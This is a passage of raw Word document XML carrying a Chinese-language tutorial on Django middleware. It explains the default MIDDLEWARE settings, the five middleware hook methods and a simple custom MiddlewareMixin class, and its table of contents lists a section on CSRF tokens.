        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:ind w:left="450"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId135" w:anchor="_label2" w:history="1">
        <w:r w:rsidR="00870C85" w:rsidRPr="000A3629">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="000000"/>
            <w:kern w:val="0"/>
            <w:szCs w:val="21"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>三、自定义中间件</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5F8C8AA8" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="000A3629" w:rsidRDefault="00D96E02" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:ind w:left="450"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId136" w:anchor="_label3" w:history="1">
        <w:r w:rsidR="00870C85" w:rsidRPr="000A3629">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="000000"/>
            <w:kern w:val="0"/>
            <w:szCs w:val="21"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>四</w:t>
        </w:r>
        <w:r w:rsidR="00870C85" w:rsidRPr="000A3629">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="000000"/>
            <w:kern w:val="0"/>
            <w:szCs w:val="21"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r w:rsidR="00870C85" w:rsidRPr="000A3629">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="000000"/>
            <w:kern w:val="0"/>
            <w:szCs w:val="21"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>中间件应用场景</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2DB0463E" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="000A3629" w:rsidRDefault="00D96E02" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:ind w:left="450"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId137" w:anchor="_label4" w:history="1">
        <w:r w:rsidR="00870C85" w:rsidRPr="000A3629">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="000000"/>
            <w:kern w:val="0"/>
            <w:szCs w:val="21"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>五</w:t>
        </w:r>
        <w:r w:rsidR="00870C85" w:rsidRPr="000A3629">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="000000"/>
            <w:kern w:val="0"/>
            <w:szCs w:val="21"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>  CSRF_TOKEN</w:t>
        </w:r>
        <w:r w:rsidR="00870C85" w:rsidRPr="000A3629">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="000000"/>
            <w:kern w:val="0"/>
            <w:szCs w:val="21"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>跨站请求伪造</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="78846C1A" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="000A3629" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="4A708B"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="3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一、什么是中间件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B340F72"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中间件顾名思义，是</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>介于</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>request</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>与</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>response</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>处理之间的一道处理过程</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，相对比较轻量级，并且在全局上改变</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的输入与输出。因为改变的是全局，所以需要谨慎实用，用不好会影响到性能</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67412E67"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中间价官网定义：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A9E02C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Middleware </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a framework of hooks into Django’s request/response processing. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ADD729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It’s a light, low-level “plugin” system </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>for</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> globally altering Django’s input </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>or</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> output.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C81228F"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中间件位于</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>服务端与</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>路由层之间</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DCCCBED" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="000A3629" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="4A708B"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="3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二、中间件有什么用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04B805B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如果你想修改请求，例如被传送到</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>view</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中的</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HttpRequest</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或者你想修改</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>view</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>返回的</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HttpResponse</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>对象，这些都可以通过中间件来实现。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22BFDCF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可能你还想在</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>view</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>执行之前做一些操作，这种情况就可以用</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> middleware</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>来实现。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="358C3B3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默认的中间件：（在</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项目的</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>settings</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>模块中，有一个</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> MIDDLEWARE_CLASSES </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>变量，其中每一个元素就是一个中间件，如下图）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FC82D6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MIDDLEWARE = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D83B24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'django.middleware.security.SecurityMiddleware'</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6059FA3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'django.contrib.sessions.middleware.SessionMiddleware'</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76E02BC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'django.middleware.common.CommonMiddleware'</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10FD36E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'django.middleware.csrf.CsrfViewMiddleware'</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D31322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'django.contrib.auth.middleware.AuthenticationMiddleware'</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="435F1A3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'django.contrib.messages.middleware.MessageMiddleware'</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="327E052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'django.middleware.clickjacking.XFrameOptionsMiddleware'</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E1F023B" w14:textId="77777777" w:rsidR="00D8288D"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 'app01.mymid.MyMid1',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27987A18" w14:textId="45CB2A35"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 'app01.mymid.MyMid2',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F90A4C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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B0EAA7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请求进来是自上而下，通过反射找到类，用</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>for</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>循环来执行，可以自定义中间件，但是也要写在</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>MIDDLEWARE</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中，可以在</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>app01</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>下创建一个</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>mymid.py</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>文件来写我们自定义的中间件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CAE1282"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每一个中间件都有具体的功能</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D08F46B" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="000A362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三、自定义中间件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B959BFD"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中间件可以定义五个方法，分别是：（主要的是</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和</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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="658E210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1、process_request(self,request)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="189728E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2、process_view(self, request, callback, callback_args, callback_kwargs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A07C67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3、process_template_response(self,request,response)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="175643D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4、process_exception(self, request, exception)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63762D6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5、process_response(self, request, response)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47B8CA7E"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以上方法的返回值可以是</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或一个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对象，如果是</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，则继续按照</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定义的规则向后继续执行，如果是</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对象，则直接将该对象返回给用户。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="173D2A3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详细用法见下方：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2088CBFC"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1、process_request和process_response</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B0633C7"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当用户发起请求的时候会依次经过所有的的中间件，这个时候的请求时</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最后到达</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的函数中，</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函数处理后，在依次穿过中间件，这个时候是</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最后返回给请求者。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77FD19BA"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lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="65FB5288" wp14:editId="759A174D">
            <wp:extent cx="9200554" cy="3268133"/>
            <wp:effectExtent l="0" t="0" r="63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222321" cy="3275865"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="43D0FCDD"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上述截图中的中间件都是</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中的，我们也可以自己定义一个中间件，我们可以自己写一个类，</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>但是必须继承</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>MiddlewareMixin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="438193B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第一步：导入</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D0C766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django.utils.deprecation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MiddlewareMixin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4226F342"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第二步：自定义中间件</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4EFA6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django.utils.deprecation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MiddlewareMixin</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FE9099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django.shortcuts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HttpResponse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A2123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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2451EF5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7658CD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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47E0E2B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1965D28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724B702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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="531A1E1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2C026DA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7435195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341B47D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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="159F3C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Md2(MiddlewareMixin):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18D916D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lastRenderedPageBreak/>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B4EDB4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7B3FE99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"Md2请求"</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DF1572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HttpResponse("Md2中断")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EA8E1B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r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FE7D09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"Md2返回"</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
